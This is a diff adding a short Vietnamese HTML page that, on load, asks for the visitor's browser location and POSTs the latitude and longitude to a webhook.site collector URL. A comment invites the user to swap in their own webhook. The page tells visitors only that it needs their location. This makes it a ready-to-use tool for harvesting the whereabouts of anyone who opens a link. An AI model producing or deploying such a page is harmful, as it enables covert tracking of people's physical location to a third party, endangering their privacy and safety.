@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lấy vị trí người dùng</title>
+</head>
+<body>
+  <h3>Trang này cần truy cập vị trí của bạn</h3>
+  <p id="status">Đang kiểm tra vị trí...</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("https://webhook.site/9a195108-790c-44c6-a166-af384416a1eb", { // <- Thay bằng URL webhook của bạn
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      }).then(() => {
+        document.getElementById("status").innerText = "Đã gửi vị trí về máy chủ.";
+      }).catch(() => {
+        document.getElementById("status").innerText = "Gửi thất bại.";
+      });
+    }
+
+    function getLocation() {
+      if (!navigator.geolocation) {
+        document.getElementById("status").innerText = "Trình duyệt không hỗ trợ định vị.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
+        () => document.getElementById("status").innerText = "Không lấy được vị trí."
+      );
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
